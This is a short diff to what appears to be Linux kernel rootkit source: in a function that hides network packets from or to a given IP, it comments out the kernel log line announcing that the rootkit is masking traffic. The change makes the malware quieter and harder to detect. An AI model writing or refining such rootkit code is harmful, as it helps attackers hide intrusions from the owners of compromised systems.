@@ -378,7 +378,7 @@ int mask_packets(char *ip)
 
 	list_add(&new->list, &masked_ips);
 
-	printk(KERN_INFO "rootkit packet_masking: masking packets from/to IP %s\n", ip);
+	//printk(KERN_INFO "rootkit packet_masking: masking packets from/to IP %s\n", ip);
 
 	return 0;
 }
